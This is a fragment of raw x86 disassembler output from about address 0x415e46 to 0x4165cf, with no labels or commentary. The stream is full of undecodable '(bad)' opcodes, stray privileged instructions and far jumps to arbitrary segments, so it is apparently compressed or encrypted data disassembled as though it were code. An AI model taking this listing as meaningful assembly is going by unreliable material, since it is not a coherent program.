  415e46:	cmp    BYTE PTR [eax+0x7c],ah
  415e49:	aad    0x62
  415e4b:	fisub  WORD PTR [ecx+0x5f1e3cd9]
  415e51:	mov    edx,0xee4fd50c
  415e56:	inc    ecx
  415e57:	adc    al,0xf0
  415e59:	mov    cl,0xb5
  415e5b:	xchg   esp,eax
  415e5c:	into   
  415e5d:	stc    
  415e5e:	mov    edi,0xc094b90d
  415e63:	sbb    BYTE PTR [esi+0x33b0c96e],al
  415e69:	repz push edi
  415e6b:	stos   DWORD PTR es:[edi],eax
  415e6c:	pop    ebp
  415e6d:	mov    DWORD PTR [edx+eiz*2],ebp
  415e70:	sub    al,0xb
  415e72:	sahf   
  415e73:	inc    ebx
  415e74:	addr16 sahf 
  415e76:	xor    al,0x20
  415e78:	dec    DWORD PTR [edi]
  415e7a:	cwde   
  415e7b:	mov    ?,WORD PTR [edi-0x51]
  415e7e:	mov    edi,0x2758d17b
  415e83:	or     eax,0xd2d4450
  415e88:	dec    esi
  415e89:	inc    esp
  415e8a:	mov    bh,BYTE PTR cs:[eax]
  415e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e8e:	dec    edi
  415e8f:	cmp    dl,BYTE PTR [edi+0x68]
  415e92:	lods   al,BYTE PTR ds:[esi]
  415e93:	jmp    0xf78e:0x6b2dba5f
  415e9a:	push   ds
  415e9b:	lea    edx,[edi]
  415e9d:	pop    edi
  415e9e:	dec    edi
  415e9f:	icebp  
  415ea0:	xchg   ebp,eax
  415ea1:	pop    esp
  415ea2:	and    al,0x3c
  415ea4:	scas   eax,DWORD PTR es:[edi]
  415ea5:	and    DWORD PTR [esi],edi
  415ea7:	pop    ebx
  415ea8:	leave  
  415ea9:	xlat   BYTE PTR ds:[ebx]
  415eaa:	lods   al,BYTE PTR ds:[esi]
  415eab:	mov    dh,0xb9
  415ead:	mov    DWORD PTR [ebx+0x6abc8a09],edi
  415eb3:	cmp    ecx,DWORD PTR [edx]
  415eb5:	cld    
  415eb6:	jge    0x415e8e
  415eb8:	inc    edx
  415eb9:	mov    DWORD PTR [esi],0xeed6be84
  415ebf:	push   es
  415ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec1:	shr    bl,1
  415ec3:	emms   
  415ec5:	icebp  
  415ec6:	inc    ebp
  415ec7:	ins    DWORD PTR es:[edi],dx
  415ec8:	cwde   
  415ec9:	xor    bh,BYTE PTR [esi-0x79]
  415ecc:	xchg   ebp,eax
  415ecd:	add    edx,DWORD PTR [ebx+edx*4-0x64fd6693]
  415ed4:	loope  0x415e8f
  415ed6:	sub    esp,esp
  415ed8:	aad    0xce
  415eda:	lock ret 0xc1a0
  415ede:	mov    edx,0x87d5a34f
  415ee3:	(bad)  
  415ee4:	fld    DWORD PTR [eax]
  415ee6:	aaa    
  415ee7:	out    dx,al
  415ee8:	xchg   BYTE PTR [edi+0xb],bl
  415eeb:	sbb    eax,DWORD PTR [esi+ebp*4-0xc921227]
  415ef2:	inc    edx
  415ef3:	jge    0x415f1c
  415ef5:	dec    esp
  415ef6:	pop    ss
  415ef7:	iret   
  415ef8:	nop
  415ef9:	(bad)  
  415efa:	cmp    BYTE PTR [ecx],dl
  415efc:	jb     0x415e97
  415efe:	dec    ecx
  415eff:	call   0x7b14:0x100fb27b
  415f06:	(bad)  
  415f07:	out    0x3a,eax
  415f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f0a:	push   ss
  415f0b:	repz jno 0xc6d4c109
  415f12:	sub    al,0x52
  415f14:	clc    
  415f15:	sbb    eax,0x106a810a
  415f1a:	dec    esi
  415f1b:	sub    ecx,DWORD PTR [eax+0x20]
  415f1e:	jbe    0x415ef7
  415f20:	js     0x415ecb
  415f22:	iret   
  415f23:	test   eax,0x6b040c94
  415f28:	mov    dl,0xf8
  415f2a:	cdq    
  415f2b:	jne    0x415eee
  415f2d:	xchg   edi,eax
  415f2e:	adc    al,0xf9
  415f30:	push   0xffffffcf
  415f32:	lods   al,BYTE PTR ds:[esi]
  415f33:	add    esi,0xffffffb2
  415f36:	cmp    DWORD PTR [edi-0x639045cc],ebp
  415f3c:	js     0x415f3c
  415f3e:	(bad)  
  415f3f:	jmp    FWORD PTR [edi]
  415f41:	jge    0x415ef8
  415f43:	push   ecx
  415f44:	pop    ecx
  415f45:	push   edi
  415f46:	push   ebx
  415f47:	or     edi,0x0
  415f4a:	inc    esi
  415f4b:	mov    ah,dh
  415f4d:	xor    eax,0x382b0059
  415f52:	loopne 0x415fd0
  415f54:	jb     0x415fbd
  415f56:	in     al,0x70
  415f58:	pop    ds
  415f59:	outs   dx,BYTE PTR ds:[esi]
  415f5a:	inc    edx
  415f5b:	pushf  
  415f5c:	(bad)  
  415f5d:	push   eax
  415f5e:	mov    ds:0xdb494645,al
  415f63:	scas   eax,DWORD PTR es:[edi]
  415f64:	fnstsw WORD PTR [edx]
  415f66:	mov    DWORD PTR [ebx+0x43],esi
  415f69:	(bad)  
  415f6a:	test   DWORD PTR [eax+edx*4],eax
  415f6d:	rcr    eax,cl
  415f6f:	xor    al,BYTE PTR [edi+0x17]
  415f72:	inc    edi
  415f73:	gs int 0x24
  415f76:	push   esi
  415f77:	xchg   edi,eax
  415f78:	pop    eax
  415f79:	or     esp,DWORD PTR [ebx]
  415f7b:	xchg   esp,eax
  415f7c:	pop    esi
  415f7d:	cld    
  415f7e:	(bad)  [edx-0x62]
  415f81:	inc    ebp
  415f82:	fldcw  WORD PTR [ecx]
  415f84:	mov    bl,0xde
  415f86:	jp     0x415f57
  415f88:	push   0xffffffc0
  415f8a:	pop    edx
  415f8b:	pop    esp
  415f8c:	test   eax,0xc2c3602a
  415f91:	push   eax
  415f92:	mov    bx,0x29d
  415f96:	in     al,dx
  415f97:	lea    edi,[ebx]
  415f99:	ins    DWORD PTR es:[edi],dx
  415f9a:	lahf   
  415f9b:	lahf   
  415f9c:	mov    ebx,0x46b81e2d
  415fa1:	imul   ebx,DWORD PTR [ecx-0x5],0x5a
  415fa5:	fcomi  st,st(2)
  415fa7:	dec    ebx
  415fa8:	jmp    0xfee3:0x5e393774
  415faf:	imul   edx,DWORD PTR [ecx+ebx*2],0x41e970d
  415fb6:	cld    
  415fb7:	mov    ebp,DWORD PTR [ebx+esi*2]
  415fba:	jb     0x415fc9
  415fbc:	ss cmp eax,0xd1ffb7b1
  415fc2:	les    edi,FWORD PTR [ebx]
  415fc4:	loop   0x415fc3
  415fc6:	jp     0x416032
  415fc8:	push   esi
  415fc9:	sti    
  415fca:	fidiv  WORD PTR [ebp-0x29851201]
  415fd0:	fisttp DWORD PTR [ebx+0x4c]
  415fd3:	mov    ch,0x1c
  415fd5:	test   BYTE PTR [ecx+0x22],cl
  415fd8:	dec    ecx
  415fd9:	stos   DWORD PTR es:[edi],eax
  415fda:	xchg   edi,eax
  415fdb:	addr16 inc esi
  415fdd:	retf   0xdf43
  415fe0:	pusha  
  415fe1:	outs   dx,BYTE PTR ds:[esi]
  415fe2:	(bad)  
  415fe3:	seta   BYTE PTR [esi-0x31]
  415fe7:	call   0x13c6be5a
  415fec:	cmp    eax,0x9c4c73aa
  415ff1:	pop    ebx
  415ff2:	es push ds
  415ff4:	push   eax
  415ff5:	xor    edi,0x38ee5732
  415ffb:	cmp    BYTE PTR [edi],bh
  415ffd:	cli    
  415ffe:	stc    
  415fff:	inc    edi
  416000:	loop   0x415f89
  416002:	stos   BYTE PTR es:[edi],al
  416003:	mov    eax,ds:0x7e6dcca5
  416008:	jge    0x416056
  41600a:	mov    ebx,DWORD PTR [ebp-0x78eaa95b]
  416010:	inc    esi
  416011:	daa    
  416012:	imul   ebx,DWORD PTR [ebp-0x3f672dd],0xe51c14e3
  41601c:	dec    ebx
  41601d:	dec    edi
  41601e:	lea    ebp,[edx+0x6b1d4fa7]
  416024:	inc    ecx
  416025:	leave  
  416026:	and    bl,bh
  416028:	cs push edx
  41602a:	and    al,0xe2
  41602c:	outs   dx,DWORD PTR ds:[esi]
  41602d:	rcr    BYTE PTR [esp+eax*8-0x41],cl
  416031:	push   esi
  416032:	adc    ebp,ecx
  416034:	jg     0x4160aa
  416036:	pop    ss
  416037:	test   DWORD PTR [edi-0x2d],esp
  41603a:	mov    DWORD PTR [esi],0x73e61d7f
  416040:	mov    esi,0xa686bebf
  416045:	jecxz  0x4160a7
  416047:	call   0xe9c541db
  41604c:	call   0xf32fceb
  416051:	sub    esi,DWORD PTR [esi+0x7f545678]
  416057:	lock imul esi,eax,0x1356fdf4
  41605e:	(bad)  [edi+edx*8+0x7e]
  416062:	ret    
  416063:	push   edi
  416064:	cmp    al,0x5b
  416066:	aad    0x23
  416068:	lea    esi,[eax+0x2567851a]
  41606e:	sbb    bl,BYTE PTR [ecx+0x10]
  416071:	inc    esi
  416072:	imul   ebx,DWORD PTR [ebp-0x5776890a],0xb67192aa
  41607c:	das    
  41607d:	mov    DWORD PTR [edx],edx
  41607f:	mov    edi,DWORD PTR [edi+0x30fdf4d8]
  416085:	or     esp,DWORD PTR [eax+0x0]
  416088:	jmp    0x47d1ee5e
  41608d:	mov    bl,0xdf
  41608f:	sbb    DWORD PTR [ecx],ebx
  416091:	or     dl,ah
  416093:	dec    esi
  416094:	cmp    DWORD PTR [ebx],edi
  416096:	rol    BYTE PTR [edi+0x4143e15],0x4e
  41609d:	imul   ecx,DWORD PTR [edx-0x4031d101],0x27
  4160a4:	add    BYTE PTR [ebx+0x36],0x9d
  4160a8:	pop    eax
  4160a9:	jno    0x416101
  4160ab:	adc    eax,0xcd687760
  4160b0:	ss sbb eax,0x790b16a7
  4160b6:	mov    esp,0xeefff9a1
  4160bb:	les    eax,FWORD PTR [ebp-0x6f5ced5e]
  4160c1:	sahf   
  4160c2:	addr16 nop
  4160c4:	sbb    eax,esi
  4160c6:	mov    ?,edi
  4160c8:	clc    
  4160c9:	out    0x36,al
  4160cb:	nop
  4160cc:	mov    ch,0x11
  4160ce:	cwde   
  4160cf:	jmp    0xfd3c:0x8a26166e
  4160d6:	jmp    0x8876:0xc8a39f91
  4160dd:	mov    al,0x78
  4160df:	sbb    BYTE PTR [edx+0x74],bh
  4160e2:	ins    DWORD PTR es:[edi],dx
  4160e3:	inc    ebx
  4160e4:	pop    ebx
  4160e5:	hlt    
  4160e6:	or     al,0x1
  4160e8:	movntps XMMWORD PTR [edx+0x55351f9],xmm0
  4160ef:	enter  0x77b1,0x88
  4160f3:	dec    edx
  4160f4:	fwait
  4160f5:	(bad)  
  4160f6:	ins    BYTE PTR es:[edi],dx
  4160f7:	(bad)  
  4160f8:	push   esi
  4160f9:	jns    0x4160f3
  4160fb:	cmp    bl,al
  4160fd:	sub    eax,0x8b159f6f
  416102:	ja     0x4160d2
  416104:	aad    0x8a
  416106:	out    dx,al
  416107:	and    esi,esi
  416109:	mov    eax,0x1905b5e0
  41610e:	pushf  
  41610f:	int3   
  416110:	push   esi
  416111:	xor    bl,BYTE PTR [edx-0x343787c4]
  416117:	dec    esp
  416118:	mov    ebx,0xf4ea5fa4
  41611d:	sub    al,0x2b
  41611f:	pop    esi
  416120:	jg     0x416137
  416122:	jo     0x4160b0
  416124:	sbb    eax,ecx
  416126:	xor    ebp,DWORD PTR ds:0xc9ef801c
  41612c:	pop    edx
  41612d:	sar    BYTE PTR [ebp+0x1f77166b],1
  416133:	mov    esp,0x9656182
  416138:	xor    ch,al
  41613a:	mov    dl,0xaa
  41613c:	js     0x416109
  41613e:	lock push ss
  416140:	cld    
  416141:	mov    ?,edi
  416143:	mov    WORD PTR [edi+0x1422751c],fs
  416149:	or     al,0xbd
  41614b:	xchg   ebp,eax
  41614c:	cmp    DWORD PTR [ebx-0x58487367],edx
  416152:	jmp    0x41618b
  416154:	cs enter 0xd15e,0xcd
  416159:	or     cl,BYTE PTR [ecx-0x6c]
  41615c:	dec    esi
  41615d:	pop    edx
  41615e:	sub    dh,BYTE PTR [esi+0x5]
  416161:	dec    ecx
  416162:	lods   al,BYTE PTR ds:[esi]
  416163:	jno    0x416132
  416165:	rcl    DWORD PTR [ebp+0x65],0x9
  416169:	push   edx
  41616a:	mov    DWORD PTR [edi-0x11],eax
  41616d:	jg     0x416108
  41616f:	(bad)  
  416170:	bound  edi,QWORD PTR [ebx]
  416172:	jl     0x4161ee
  416174:	push   fs
  416176:	aas    
  416177:	add    ebp,DWORD PTR [esi+0x1f9af2c0]
  41617d:	push   ebx
  41617e:	and    edi,DWORD PTR [ebx+0x102751e6]
  416184:	neg    bl
  416186:	test   eax,0x7f69fde2
  41618b:	sbb    eax,0xf50bafc0
  416190:	popf   
  416191:	ins    DWORD PTR es:[edi],dx
  416192:	mov    DWORD PTR [edi-0x77],edi
  416195:	mov    WORD PTR [ecx-0x24cc530b],?
  41619b:	mov    gs,WORD PTR [edi-0x39]
  41619e:	inc    edx
  41619f:	aaa    
  4161a0:	push   es
  4161a1:	add    edi,ecx
  4161a3:	mov    edi,0xaa3d21bf
  4161a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a9:	fmul   st(0),st
  4161ab:	xchg   ebx,eax
  4161ac:	arpl   WORD PTR [ecx],cx
  4161ae:	mov    ah,0xd2
  4161b0:	imul   eax,DWORD PTR [edx-0x36],0x17
  4161b4:	xchg   ebx,eax
  4161b5:	cmp    al,BYTE PTR [ebp-0x51]
  4161b8:	loope  0x41622c
  4161ba:	cmp    esi,DWORD PTR [ebx+0x284b8212]
  4161c0:	cmp    edi,DWORD PTR [edx+edx*8+0x16c76f7]
  4161c7:	mov    edx,0xb7d45d96
  4161cc:	add    BYTE PTR [edi-0x29bc417f],dh
  4161d2:	mov    ecx,0x2100643e
  4161d7:	xor    eax,0x9941a7d
  4161dc:	lods   eax,DWORD PTR ds:[esi]
  4161dd:	pop    ds
  4161de:	adc    BYTE PTR [esi],0xe
  4161e1:	xchg   ebp,eax
  4161e2:	pop    ebx
  4161e3:	xchg   edx,eax
  4161e4:	xor    BYTE PTR [edi+eiz*2-0x63],ah
  4161e8:	call   0x64b0cac9
  4161ed:	add    DWORD PTR [esi+0xe],eax
  4161f0:	jb     0x4161ad
  4161f2:	loopne 0x416264
  4161f4:	push   ebx
  4161f5:	or     eax,0xa51a9c49
  4161fa:	pop    esp
  4161fb:	pop    eax
  4161fc:	ret    0xa314
  4161ff:	loope  0x416220
  416201:	test   DWORD PTR [ebp-0x4d7d1f18],esi
  416207:	les    esp,FWORD PTR [esi-0x56]
  41620a:	mov    cl,dh
  41620c:	ret    
  41620d:	fdivr  DWORD PTR [ebp+0x24669bb9]
  416213:	in     eax,0x65
  416215:	ficomp DWORD PTR [esp+ebx*4-0x4f8bb1f0]
  41621c:	xor    ebx,esi
  41621e:	and    BYTE PTR [ecx-0x3c],al
  416221:	sar    BYTE PTR [ecx-0x1a],0x45
  416225:	gs out 0xa6,al
  416228:	mov    ds:0x9e4e1662,eax
  41622d:	xor    esi,DWORD PTR [ebx+0x1012152d]
  416233:	mov    ebp,0x88048ef4
  416238:	jp     0x416204
  41623a:	enter  0x42d6,0x8f
  41623e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41623f:	sti    
  416240:	lahf   
  416241:	mov    bl,0x1e
  416243:	pop    esi
  416244:	mul    DWORD PTR [esi]
  416246:	mov    bl,0xfb
  416248:	rcl    BYTE PTR ds:0xf5d4a7a8,1
  41624e:	dec    ecx
  41624f:	lods   eax,DWORD PTR ds:[esi]
  416250:	dec    BYTE PTR [eax-0x3e]
  416253:	xchg   BYTE PTR [esi],bh
  416255:	adc    eax,0xc057a81c
  41625a:	dec    eax
  41625b:	in     eax,0xa9
  41625d:	mov    bl,0xec
  41625f:	xchg   BYTE PTR [edi+0x1],ah
  416262:	aad    0xb
  416264:	mov    BYTE PTR [edi-0x138dd8f9],0xaa
  41626b:	(bad)  
  41626d:	sub    dl,BYTE PTR [esp+edx*2]
  416270:	mov    cl,0x1
  416272:	lahf   
  416273:	cmc    
  416274:	jg     0x41620d
  416276:	xor    al,0xbd
  416278:	and    esi,esi
  41627a:	cmp    esp,esp
  41627c:	pop    edi
  41627d:	xchg   ebp,eax
  41627e:	and    BYTE PTR [ebp+0x62],bl
  416281:	jnp    0x4162ea
  416283:	ret    
  416284:	and    eax,0xbbd1535b
  416289:	test   al,0xe
  41628b:	xor    bh,0x23
  41628e:	test   DWORD PTR [eax-0xe8a9c29],ecx
  416294:	mov    eax,edi
  416296:	(bad)  
  416297:	jae    0x416252
  416299:	push   ss
  41629a:	rcr    BYTE PTR [ecx-0x44],0xf4
  41629e:	std    
  41629f:	add    al,0x69
  4162a1:	jno    0x4162b4
  4162a3:	push   0x1f
  4162a5:	ja     0x416288
  4162a7:	xor    si,di
  4162aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162ab:	inc    esp
  4162ac:	mov    ds:0x6d1949e9,eax
  4162b1:	sbb    ebp,ebp
  4162b3:	mov    dl,0xb
  4162b5:	mov    bl,0xa0
  4162b7:	aas    
  4162b8:	popf   
  4162b9:	mov    ch,0x7e
  4162bb:	(bad)  
  4162bc:	sbb    ch,BYTE PTR [edx+0x1263d052]
  4162c2:	adc    DWORD PTR [esi],ecx
  4162c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162c5:	jb     0x41626e
  4162c7:	jo     0x4162f5
  4162c9:	nop
  4162ca:	ins    BYTE PTR es:[edi],dx
  4162cb:	xor    ebp,DWORD PTR [edx+ecx*2]
  4162ce:	xchg   edx,eax
  4162cf:	mov    dl,BYTE PTR [ecx]
  4162d1:	imul   esp,DWORD PTR [esi],0x23cf3fe2
  4162d7:	cmp    al,0x4c
  4162d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162da:	gs addr16 (bad) 
  4162dd:	cmp    edx,DWORD PTR [ebp-0xbf98ba3]
  4162e3:	mov    bh,0x8
  4162e5:	push   eax
  4162e6:	clc    
  4162e7:	out    0xd9,al
  4162e9:	imul   ecx,DWORD PTR [ebx],0x3867a21e
  4162ef:	sub    edi,ebp
  4162f1:	int    0x92
  4162f3:	xchg   ecx,eax
  4162f4:	jo     0x416372
  4162f6:	xchg   edi,eax
  4162f7:	xchg   ebp,eax
  4162f8:	call   0x840e:0x66c5921c
  4162ff:	in     al,0x67
  416301:	js     0x4162af
  416303:	push   DWORD PTR [edx+0x30d22d08]
  416309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41630a:	idiv   esi
  41630c:	lahf   
  41630d:	cmp    DWORD PTR [eax],edx
  41630f:	das    
  416310:	dec    edx
  416311:	enter  0xb8d9,0x95
  416315:	xor    bl,BYTE PTR [ecx]
  416317:	addr16 inc edi
  416319:	aas    
  41631a:	cmp    ecx,DWORD PTR [eax]
  41631c:	sbb    bh,ch
  41631e:	sbb    eax,0x3373906b
  416323:	adc    al,0xb4
  416325:	repnz sub edx,eax
  416328:	jge    0x416372
  41632a:	xchg   ebx,eax
  41632b:	mov    ch,0x8d
  41632d:	xchg   esi,eax
  41632e:	fild   QWORD PTR [ebp+0x220d867f]
  416334:	mov    edi,0x5c73a93d
  416339:	sbb    bh,ch
  41633b:	scas   eax,DWORD PTR es:[edi]
  41633c:	mov    edi,0x41b923ff
  416341:	inc    ebp
  416342:	fmul   DWORD PTR [eax+0x75]
  416345:	icebp  
  416346:	out    dx,eax
  416347:	call   0xa625:0xed71e6c7
  41634e:	mul    BYTE PTR ds:0xead2136e
  416354:	lahf   
  416355:	jge    0x41633f
  416357:	mov    ebx,0x48efcb5f
  41635c:	fwait
  41635d:	das    
  41635e:	popa   
  41635f:	imul   ebx,DWORD PTR [edx],0xcd764c50
  416365:	out    0xc7,al
  416367:	fstp   TBYTE PTR [esi]
  416369:	pop    ss
  41636a:	inc    edi
  41636b:	std    
  41636c:	adc    ecx,0x19
  41636f:	push   eax
  416370:	mov    ds:0x63fbcbf8,al
  416375:	mov    edi,DWORD PTR [ecx-0x43]
  416378:	les    edi,FWORD PTR [ecx+0xa0b21f5]
  41637e:	punpckhdq mm5,mm3
  416381:	and    bh,BYTE PTR [ebp+0x46779cce]
  416387:	jg     0x416309
  416389:	jne    0x4163bd
  41638b:	je     0x4163cf
  41638d:	test   eax,0x7fca0a45
  416392:	adc    eax,0xb238977
  416397:	cmp    esp,DWORD PTR [eax]
  416399:	or     ecx,DWORD PTR [ecx+ecx*8-0x44]
  41639d:	imul   ebp,DWORD PTR [eax+0xa688b4d],0xffffffe2
  4163a4:	call   0x31b:0x9c9eeebb
  4163ab:	jnp    0x416377
  4163ad:	push   edi
  4163ae:	(bad)  
  4163af:	sbb    ch,BYTE PTR [eax+0x4a]
  4163b2:	mov    WORD PTR [edx-0x1],ds
  4163b5:	shl    DWORD PTR [edi],cl
  4163b7:	adc    eax,0x7fc9d48a
  4163bc:	les    eax,FWORD PTR [esi+0x71]
  4163bf:	das    
  4163c0:	add    BYTE PTR [ebx+0xb],cl
  4163c3:	rcr    edi,0x2f
  4163c6:	adc    ebp,DWORD PTR [esi+ebp*2-0x3f]
  4163ca:	ror    DWORD PTR [eax],0x6
  4163cd:	unpcklps xmm2,xmm5
  4163d0:	sub    bh,cl
  4163d2:	mov    dh,0xa8
  4163d4:	(bad)  
  4163d5:	cwde   
  4163d6:	jb     0x4163d8
  4163d8:	leave  
  4163d9:	icebp  
  4163da:	sub    al,0xf5
  4163dc:	mov    edx,0x47f8bddc
  4163e1:	jge    0x41642b
  4163e3:	xor    ecx,edi
  4163e5:	push   cs
  4163e6:	jg     0x416388
  4163e8:	mov    WORD PTR [ebx],es
  4163ea:	ja     0x416448
  4163ec:	popa   
  4163ed:	sbb    BYTE PTR [ebx+ebx*1+0x1bb64e82],ah
  4163f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f5:	test   al,0x53
  4163f7:	jmp    0x4cd9:0x90c09a1c
  4163fe:	xchg   esi,eax
  4163ff:	dec    esi
  416400:	push   esp
  416401:	inc    ebx
  416402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416404:	sub    DWORD PTR [ebx+0x70122508],ebx
  41640a:	mov    ah,0x48
  41640c:	mov    WORD PTR [edx-0x4b75dede],gs
  416412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416413:	clc    
  416414:	jg     0x4163ad
  416416:	or     ebx,DWORD PTR [ecx]
  416418:	daa    
  416419:	nop
  41641a:	int3   
  41641b:	pop    esp
  41641c:	data16 stos BYTE PTR es:[edi],al
  41641e:	xor    al,0x63
  416420:	xor    DWORD PTR [edi+edi*1],0x462f8549
  416427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416428:	mov    dl,0x30
  41642a:	sub    DWORD PTR [ecx+ebp*8-0x74],edi
  41642e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41642f:	sub    dl,BYTE PTR [eax+ebp*8]
  416432:	mov    ah,BYTE PTR [edx+0x7]
  416435:	cmp    ch,BYTE PTR [edx+0x68]
  416438:	pop    ebp
  416439:	jae    0x41644d
  41643b:	sub    BYTE PTR [esi+0x53745690],bh
  416441:	or     BYTE PTR [edi-0x22],dl
  416444:	mov    dh,0x3b
  416446:	aaa    
  416447:	lock xor ch,BYTE PTR [esi+0x7772c307]
  41644e:	dec    ebx
  41644f:	sbb    edi,DWORD PTR [ecx-0x5e]
  416452:	add    al,0xf7
  416454:	push   edx
  416455:	jge    0x4164b4
  416457:	dec    esi
  416458:	ds cwde 
  41645a:	iret   
  41645b:	jp     0x416486
  41645d:	mov    ds,WORD PTR [ebx]
  41645f:	call   0xc213458d
  416464:	lds    esi,FWORD PTR [eax+eiz*1]
  416467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416468:	pusha  
  416469:	push   cs
  41646a:	cmp    eax,0x11f69304
  41646f:	cld    
  416470:	jmp    0x41644d
  416472:	jmp    0x41648e
  416474:	cmp    DWORD PTR [edx+ebp*1-0x61],ebx
  416478:	or     esp,DWORD PTR [esi]
  41647a:	div    edx
  41647c:	mov    al,BYTE PTR [edx-0x35]
  41647f:	push   edi
  416480:	xor    BYTE PTR [eax-0x4b],ch
  416483:	mov    bh,0x81
  416485:	dec    esi
  416486:	xor    DWORD PTR [ecx+0x1dacc8dd],ecx
  41648c:	int    0x2a
  41648e:	mov    ebp,0x3bf22636
  416493:	pop    eax
  416494:	(bad)  
  416495:	xchg   ebx,eax
  416496:	aaa    
  416497:	and    BYTE PTR [eax-0x3f],ch
  41649a:	inc    esp
  41649b:	xor    BYTE PTR [eax-0xe],ah
  41649e:	hlt    
  41649f:	or     cl,BYTE PTR [edi+0x7f93ed27]
  4164a5:	cmp    cl,BYTE PTR [eax]
  4164a7:	fbstp  TBYTE PTR [ebx+0x5f428791]
  4164ad:	xchg   ecx,eax
  4164ae:	jmp    0x41643a
  4164b0:	stos   DWORD PTR es:[edi],eax
  4164b1:	pop    edx
  4164b2:	call   0x6723bf09
  4164b7:	in     eax,0x1
  4164b9:	inc    edi
  4164ba:	cmc    
  4164bb:	xchg   ebp,eax
  4164bc:	push   ds
  4164bd:	and    edi,ebp
  4164bf:	(bad)  
  4164c0:	xchg   ecx,eax
  4164c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c2:	push   es
  4164c3:	stc    
  4164c4:	outs   dx,DWORD PTR ds:[esi]
  4164c5:	ficom  DWORD PTR [esi-0x6f]
  4164c8:	adc    bh,cl
  4164ca:	loopne 0x416545
  4164cc:	pop    ss
  4164cd:	fcmovnb st,st(4)
  4164cf:	and    DWORD PTR [ecx+0x5cd042b0],0xc096a0f7
  4164d9:	jae    0x4164c8
  4164db:	test   al,0xdb
  4164dd:	pop    esp
  4164de:	dec    ebx
  4164df:	jle    0x416489
  4164e1:	mov    eax,ds:0x569566c4
  4164e6:	dec    esp
  4164e7:	fldenv [edi]
  4164e9:	imul   BYTE PTR [ebx-0x3d]
  4164ec:	ins    BYTE PTR es:[edi],dx
  4164ed:	jo     0x4164ef
  4164ef:	cld    
  4164f0:	pop    ds
  4164f1:	jge    0x41647f
  4164f3:	ja     0x416512
  4164f5:	push   es
  4164f6:	xlat   BYTE PTR ds:[ebx]
  4164f7:	push   eax
  4164f8:	mov    ah,0xbe
  4164fa:	add    BYTE PTR [edi],dl
  4164fc:	adc    edx,DWORD PTR [edi-0x7f70cbbc]
  416502:	or     eax,0x9811f96
  416507:	xor    al,ah
  416509:	jno    0x41653e
  41650b:	inc    edx
  41650c:	add    ah,BYTE PTR [ebp+0x79d12987]
  416512:	je     0x41649a
  416514:	adc    BYTE PTR [edi],dh
  416516:	retf   0x952
  416519:	sar    DWORD PTR [edx-0x3f],0xc
  41651d:	adc    BYTE PTR [ebx],al
  41651f:	inc    edi
  416520:	jmp    0x416519
  416522:	repz sub DWORD PTR ds:0x1b25a91f,ebx
  416529:	mov    fs:0xefe4fac,al
  41652f:	xchg   ecx,eax
  416530:	add    DWORD PTR [eax],0xd118ba38
  416536:	gs sti 
  416538:	inc    edi
  416539:	cmp    dh,al
  41653b:	jmp    0x4164be
  41653d:	or     BYTE PTR [esi],dh
  41653f:	es scas eax,DWORD PTR es:[edi]
  416541:	nop
  416542:	fild   WORD PTR [edi]
  416544:	xor    ebx,ecx
  416546:	lods   al,BYTE PTR ds:[esi]
  416547:	(bad)  
  416548:	sbb    ch,BYTE PTR [edx]
  41654a:	cmp    esi,esp
  41654c:	out    0x9b,al
  41654e:	sbb    esi,DWORD PTR [ebx-0x1e]
  416551:	cmp    edx,eax
  416553:	pop    edi
  416554:	scas   eax,DWORD PTR es:[edi]
  416555:	xor    ecx,DWORD PTR [ebx+eiz*2-0x36]
  416559:	cmp    al,0x29
  41655b:	sar    DWORD PTR [edx+0x25b669ba],0xef
  416562:	iret   
  416563:	xchg   esi,eax
  416564:	cmp    BYTE PTR [ecx+0x1f],bh
  416567:	icebp  
  416568:	cmp    DWORD PTR [edx-0x73],edx
  41656b:	sub    bh,BYTE PTR [ebp+ecx*2+0xf]
  41656f:	enter  0x2ba7,0x2c
  416573:	or     eax,esi
  416575:	push   edi
  416576:	lods   eax,DWORD PTR ds:[esi]
  416577:	cli    
  416578:	jecxz  0x41651f
  41657a:	pop    ecx
  41657b:	inc    ecx
  41657c:	pop    esp
  41657d:	xchg   edi,eax
  41657e:	fist   DWORD PTR [eax+edx*1]
  416581:	stos   BYTE PTR es:[edi],al
  416582:	lods   al,BYTE PTR ds:[esi]
  416583:	pop    edi
  416584:	mov    dl,0x8d
  416586:	call   0xa1403492
  41658b:	push   ds
  41658c:	and    BYTE PTR [edi+0x6c700211],ch
  416592:	enter  0xc0f6,0x61
  416596:	jae    0x4165e2
  416598:	dec    edi
  416599:	mov    dh,0x8e
  41659b:	icebp  
  41659c:	sahf   
  41659d:	push   eax
  41659e:	ins    DWORD PTR es:[edi],dx
  41659f:	mov    bh,0xf
  4165a1:	shl    DWORD PTR [eax],cl
  4165a3:	and    BYTE PTR [ebp+0x59],0x25
  4165a7:	pop    es
  4165a8:	mov    bh,0x89
  4165aa:	bound  edx,QWORD PTR [esi]
  4165ac:	or     eax,0x1ed3e5f
  4165b1:	(bad)  
  4165b2:	push   ebx
  4165b3:	mov    ah,0xee
  4165b5:	sub    ecx,DWORD PTR [eax]
  4165b7:	pop    ss
  4165b8:	xchg   ecx,eax
  4165b9:	call   0x7d40:0xa91f82a6
  4165c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c1:	(bad)
  4165c4:	adc    BYTE PTR [ebx],0x9
  4165c7:	out    dx,al
  4165c8:	sub    eax,DWORD PTR [ecx]
  4165ca:	jmp    0xa768b9d2
  4165cf:	aaa    
